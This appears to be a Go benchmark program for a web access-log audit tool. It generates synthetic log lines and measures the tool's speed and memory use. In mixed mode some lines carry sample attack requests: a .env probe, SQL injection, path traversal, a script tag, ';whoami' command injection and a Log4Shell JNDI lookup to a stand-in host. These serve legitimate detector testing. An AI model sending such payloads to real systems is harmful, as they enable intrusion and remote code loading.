// Command benchmark generates synthetic logs and measures the full pipeline.
package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync/atomic"
	"time"
	"webaudit/audit"
)

func main() {
	if err := bench(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
func bench() error {
	n := flag.Int("lines", 1000000, "Generated records")
	padding := flag.Int("padding", 0, "Additional UA bytes per record")
	mixed := flag.Bool("mixed", false, "Include attack requests in one fifth of records")
	flag.Parse()
	if *n < 1 || *padding < 0 || *padding > 32000 {
		return fmt.Errorf("invalid benchmark size")
	}
	dir, err := os.MkdirTemp("", "webaudit-bench-")
	if err != nil {
		return err
	}
	defer os.RemoveAll(dir)
	path := filepath.Join(dir, "access.log")
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	w := bufio.NewWriterSize(f, 1<<20)
	pad := strings.Repeat("a", *padding)
	start := time.Date(2026, 11, 1, 0, 0, 0, 0, time.UTC)
	for i := 0; i < *n; i++ {
		target := fmt.Sprintf("/api/items/%d?nonce=%d", i%32, i)
		status := 200
		if *mixed && i%5 == 0 {
			targets := []string{"/.env", "/search?q=union+select", "/../../etc/passwd", "/?x=%3Cscript%3E", "/login?x=;whoami", "/?x=${jndi:ldap://evil.test/x}"}
			target = targets[(i/5)%len(targets)]
			status = 404
		}
		_, err = fmt.Fprintf(w, "192.0.2.%d - - [%s] \"GET %s HTTP/1.1\" %d 100 \"-\" \"Mozilla/5.0%s\"\n", i%16+1, start.Add(time.Duration(i/320)*time.Second).Format("02/Jan/2006:15:04:05 -0700"), target, status, pad)
		if err != nil {
			_ = f.Close()
			return err
		}
	}
	if err = w.Flush(); err != nil {
		_ = f.Close()
		return err
	}
	if err = f.Close(); err != nil {
		return err
	}
	st, err := os.Stat(path)
	if err != nil {
		return err
	}
	runtime.GC()
	var peak atomic.Uint64
	stop := make(chan struct{})
	done := make(chan struct{})
	go func() {
		defer close(done)
		tick := time.NewTicker(10 * time.Millisecond)
		defer tick.Stop()
		for {
			select {
			case <-stop:
				return
			case <-tick.C:
				var m runtime.MemStats
				runtime.ReadMemStats(&m)
				if m.HeapAlloc > peak.Load() {
					peak.Store(m.HeapAlloc)
				}
			}
		}
	}()
	var before runtime.MemStats
	runtime.ReadMemStats(&before)
	t := time.Now()
	r := audit.Analyze([]string{path}, audit.Options{Now: func() time.Time { return start }})
	elapsed := time.Since(t)
	close(stop)
	<-done
	var mem runtime.MemStats
	runtime.ReadMemStats(&mem)
	// Compare the entire report while ignoring the random temporary directory.
	report, err := json.Marshal(r)
	if err != nil {
		return err
	}
	encodedDir, _ := json.Marshal(dir)
	report = bytes.ReplaceAll(report, encodedDir[1:len(encodedDir)-1], []byte("BENCH_INPUT"))
	digest := sha256.Sum256(report)
	return json.NewEncoder(os.Stdout).Encode(map[string]any{"synthetic": true, "mixed": *mixed, "padding": *padding, "report_sha256": fmt.Sprintf("%x", digest), "analysis_alloc_bytes": mem.TotalAlloc - before.TotalAlloc, "analysis_allocs": mem.Mallocs - before.Mallocs, "go": runtime.Version(), "os": runtime.GOOS, "arch": runtime.GOARCH, "cpus": runtime.NumCPU(), "lines": *n, "bytes": st.Size(), "elapsed_seconds": elapsed.Seconds(), "requests_per_second": float64(r.Parsed) / elapsed.Seconds(), "peak_sampled_heap_bytes": peak.Load(), "heap_sys_bytes": mem.HeapSys, "total_alloc_bytes": mem.TotalAlloc, "parsed": r.Parsed, "unparsed": r.Unparsed, "duplicates": r.Duplicates, "incidents": len(r.Findings), "partial": r.Partial, "warnings": r.Warnings})
}
